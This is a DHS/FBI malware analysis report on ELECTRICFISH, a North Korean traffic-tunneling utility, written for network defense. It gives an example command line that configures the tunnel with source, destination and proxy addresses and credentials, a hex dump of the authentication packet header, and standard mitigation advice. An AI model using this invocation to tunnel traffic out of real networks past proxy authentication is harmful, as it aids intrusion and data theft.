Summary      Description     This Malware Analysis Report (MAR) is the result of analytic efforts between DHS and the Federal Bureau of Investigation (FBI). Working with U.S. Government partners, DHS and FBI identified a malware variant used by the North Korean government. This malware has been identified as ELECTRICFISH. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us\\-cert.gov/hiddencobra.     DHS and FBI are distributing this MAR to enable network defense and reduce exposure to North Korean government malicious cyber activity.     This MAR includes malware descriptions related to HIDDEN COBRA, suggested response actions and recommended mitigation techniques. Users or administrators should flag activity associated with the malware and report the activity to the Cybersecurity and Infrastructure Security Agency (CISA) or the FBI Cyber Watch (CyWatch), and give the activity the highest priority for enhanced mitigation.     This report provides analysis of one malicious 32\\-bit Windows executable file. The malware implements a custom protocol that allows traffic to be tunneled between a source and a destination Internet Protocol (IP) address. The malware continuously attempts to reach out to the source and the designation system, which allows either side to initiate a tunneling session. The malware can be configured with a proxy server/port and proxy username and password. This feature allows connectivity to a system sitting inside of a proxy server, which allows the actor to bypass the compromised system\u2019s required authentication to reach outside of the network.

The application is a command\\-line utility and its primary purpose is to tunnel traffic between two IP addresses. The application accepts command\\-line arguments allowing it to be configured with a destination IP address and port, a source IP address and port, a proxy IP address and port, and a user name and password, which can be utilized to authenticate with a proxy server. It will attempt to establish TCP sessions with the source IP address and the destination IP address. If a connection is made to both the source and destination IPs, this malicious utility will implement a custom protocol, which will allow traffic to rapidly and efficiently be tunneled between two machines. If necessary, the malware can authenticate with a proxy to be able to reach the destination IP address. A configured proxy server is not required for this utility.     \\-\\-Begin Example Usage\\-\\-    Source IP/Port: 192\\.0\\.2\\.1:92    Dest IP/Port: 198\\.51\\.100\\.1:92    Proxy IP/Port: 203\\.0\\.113\\.1:92    Proxy User Name: test    Proxy Password: testpw     a12\\.exe \\-s 192\\.0\\.2\\.1:92 \\-d 198\\.51\\.100\\.1:92 \\-p 203\\.0\\.113\\.1:92 \\-u test \\-pw testpw    \\-\\-End Example Usage\\-\\-      After the malware authenticates with the configured proxy, it will immediately attempt to establish a session with the destination IP address, located outside of the target network and the source IP address. The header of the initial authentication packet, sent to both the source and destination systems, will be static except for two random bytes. Everything within this 34\\-byte header is static except for the bytes 0X2B6E, which will change during each connection attempt. Displayed below (and displayed in Figure 7\\) is the packet header.     \\-\\-Begin Authentication Packet Sent to Destination System\\-\\-    6161616162626262636363636464646400000000000000002B6E0000040000009210    \\-\\-End Authentication Packet Sent to Destination System\\-\\-     Screenshots          Figure 1 \\- Screenshot of the malware authenticating with the proxy server configured at command prompt.

Malware will attempt to tunnel traffic between the source and destination systems specified at command prompt.       Recommendations      CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.   * Maintain up\\-to\\-date antivirus signatures and engines. * Keep operating system patches up\\-to\\-date. * Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. * Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. * Enforce a strong password policy and implement regular password changes. * Exercise caution when opening e\\-mail attachments even if the attachment is expected and the sender appears to be known. * Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. * Disable unnecessary services on agency workstations and servers. * Scan for and remove suspicious e\\-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header). * Monitor users' web browsing habits; restrict access to sites with unfavorable content. * Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). * Scan all software downloaded from the Internet prior to executing. * Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
